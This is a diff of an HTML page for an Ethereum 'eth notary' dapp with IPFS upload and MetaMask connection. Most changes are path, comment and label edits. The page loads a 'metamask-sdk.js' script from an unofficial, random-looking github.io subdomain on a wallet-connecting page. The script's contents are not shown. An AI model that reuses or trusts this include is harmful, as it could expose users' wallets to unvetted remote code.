@@ -5,16 +5,16 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Ethereum Franchising Protocols</title>
-    <link rel="stylesheet" href="/s/static/css/foundation.css">
-    <link rel="stylesheet" href="/s/static/css/slick.css">
-    <link rel="stylesheet" href="/s/static/css/slick-theme.css">
-    <link rel="stylesheet" href="/s/static/css/app.css">
-    <link rel="stylesheet" href="/s/static/css/responsive.css">
-    <link href="/s/static/css/fontello.css" media="screen" rel="stylesheet" type="text/css" />
-    <link href="/s/static/css/font-awesome.css" media="screen" rel="stylesheet" type="text/css" />
-    <link rel="stylesheet" href="/s/static/css/linea-styles.css" />
-    <link rel="stylesheet" href="/s/static/css/linea-arrows-styles.css" />
+    <title>eth notary</title>
+    <link rel="stylesheet" href="storage/static/css/foundation.css">
+    <link rel="stylesheet" href="storage/static/css/slick.css">
+    <link rel="stylesheet" href="storage/static/css/slick-theme.css">
+    <link rel="stylesheet" href="storage/static/css/app.css">
+    <link rel="stylesheet" href="storage/static/css/responsive.css">
+    <link href="storage/static/css/fontello.css" media="screen" rel="stylesheet" type="text/css" />
+    <link href="storage/static/css/font-awesome.css" media="screen" rel="stylesheet" type="text/css" />
+    <link rel="stylesheet" href="storage/static/css/linea-styles.css" />
+    <link rel="stylesheet" href="storage/static/css/linea-arrows-styles.css" />
     <link
         href="https://fonts.googleapis.com/css?family=Montserrat:100,100i,200,200i,400,400i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i"
         rel="stylesheet">
@@ -26,27 +26,27 @@
     <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"> -->
     <meta name="msapplication-TileColor" content="#da532c">
     <meta name="theme-color" content="#ffffff">
-    <script src="/s/js/modernizr-custom.js"></script>
+    <script src="storage/js/modernizr-custom.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/ipfs/dist/index.min.js"></script>
-    <!-- <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script> -->
+    <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js" type="module"></script>
     <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
     <script>
-        function sdkf(){
-            const sdk = new MetaMaskSDK.MetaMaskSDK({
-            dappMetadata: {
-                name: 'TTT',
-                url: window.location.host,
+        // function sdkf(){
+        //     const sdk = new MetaMaskSDK.MetaMaskSDK({
+        //     dappMetadata: {
+        //         name: 'TTT',
+        //         url: window.location.host,
 
-            },
-            logging: {
-                sdk: false
-            }
-        })
+        //     },
+        //     logging: {
+        //         sdk: false
+        //     }
+        // })
 
 
 
-        }
+        // }
 
 
 
@@ -174,24 +174,25 @@
                 localStorage.setItem('ipfs_tx', result.path);
                 //localStorage.setItem('adsress', JSON.parse(re.contract).address))
 
+                let symbol = document.getElementById('lname').value;
+                localStorage.setItem('symbol', symbol);
+                let name = document.getElementById('fname').value;
+                localStorage.setItem('contract_name', name);
+
+
+
             }
             photo = document.getElementById("photo");
             let nft = reader.readAsArrayBuffer(photo.files[0]); // Read Provided File
             let name = document.getElementById('fname');
             let symbol = document.getElementById('lname');
-            // let chunk = await fetch('/request', {
-            //     method: 'POST',
-            //     headers: {
-            //       'Accept': 'application/json',
-            //       'Content-Type': 'application/json'
-            //     },
-            //     body: JSON.stringify({ "name": name.value, 'symbol': symbol.value })
-            // })
+
+
 
 
         }
         function connect() {
-            sdkf()
+            // sdkf()
             ethereum.request({ method: 'eth_requestAccounts' })
                 .then((res) => console.log('res', res))
                 .catch((e) => console.log('e', e))
@@ -206,7 +207,7 @@
 
     <script>
         function contractView() {
-            window.location.href = window.hash       }
+            window.location.href = 'contract.html'       }
     </script>
 
 
@@ -222,7 +223,7 @@
 <body>
 
     <div class="logo">
-        <a href="index.html">ETHEREUM FRANCHISING PROTOCOLS</a>
+        <a href="index.html">eth notary</a>
     </div>
     <div id="about" class="box">
         <div class="header">
@@ -230,7 +231,7 @@
                 <h2>
                     <a href="#" onclick="">
                         <video loop autoplay muted playsinline class="nav-video">
-                            <source src='/s/images/@stock/portfolio1.mov' type='video/mp4'>
+                            <source src='storage/images/@stock/portfolio1.mov' type='video/mp4'>
                         </video>
                         <svg width="600" height="338" viewBox="0 0 600 338" class="svg-graphic" id="svg-graphic-about">
                             <defs>
@@ -404,7 +405,7 @@
                 <h2>
                     <a href="#">
                         <video loop autoplay muted playsinline class="nav-video">
-                            <source src='/s/images/@stock/Work_Portfolio.mov' type='video/mp4'>
+                            <source src='storage/images/@stock/Work_Portfolio.mov' type='video/mp4'>
                         </video>
 
                         <svg width="600" height="338" viewBox="0 0 600 338" class="svg-graphic" id="svg-graphic-works">
@@ -467,7 +468,7 @@
                     <br>
                     <br>
 
-                    <label for="lname">Number of Tokens Avaiable:</label><br>
+                    <label for="lname">Number of Tokens Available:</label><br>
                     <input
                         style="box-shadow: rgba(238, 55, 55, 0.4) 5px 5px, rgba(244, 30, 30, 0.3) 10px 10px, rgba(240, 46, 46, 0.2) 15px 15px, rgba(240, 46, 46, 0.388) 20px 20px, rgba(240, 46, 49, 0.31) 25px 25px;"
                         type="text" id="lname" name="lname" value="" required="required"><br><br>
@@ -520,7 +521,7 @@
                 <h2>
                     <a href="#">
                         <video loop autoplay muted playsinline class="nav-video">
-                            <source src='/s/images/@stock/Portfolio_Blog.mov' type='video/mp4'>
+                            <source src='storage/images/@stock/Portfolio_Blog.mov' type='video/mp4'>
                         </video>
 
                         <svg width="600" height="338" viewBox="0 0 600 338" class="svg-graphic" id="svg-graphic-blog">
@@ -585,7 +586,7 @@
                 <h2>
                     <a href="#">
                         <video loop autoplay muted playsinline class="nav-video">
-                            <source src='/s/images/@stock/contact_portfolio1.mov' type='video/mp4'>
+                            <source src='storage/images/@stock/contact_portfolio1.mov' type='video/mp4'>
                         </video>
                         <svg width="600" height="338" viewBox="0 0 600 338" class="svg-graphic"
                             id="svg-graphic-contact">
@@ -671,13 +672,13 @@
         </nav>
 
 
-        <script src="/s/bower_components/jquery/dist/jquery.js"></script>
-        <script src="/s/bower_components/foundation-sites/dist/js/foundation.js"></script>
-        <script src="/s/bower_components/countto/jquery.countTo.js"></script>
-        <script src="/s/js/jquery.appear.js"></script>
-        <script src="/s/js/jquery.validate.js"></script>
-        <script src="/s/js/slick.min.js" type="text/javascript"></script>
-        <script src="/s/js/app.js"></script>
+        <script src="storage/bower_components/jquery/dist/jquery.js"></script>
+        <script src="storage/bower_components/foundation-sites/dist/js/foundation.js"></script>
+        <script src="storage/bower_components/countto/jquery.countTo.js"></script>
+        <script src="storage/js/jquery.appear.js"></script>
+        <script src="storage/js/jquery.validate.js"></script>
+        <script src="storage/js/slick.min.js" type="text/javascript"></script>
+        <script src="storage/js/app.js"></script>
 </body>
 
 </html>
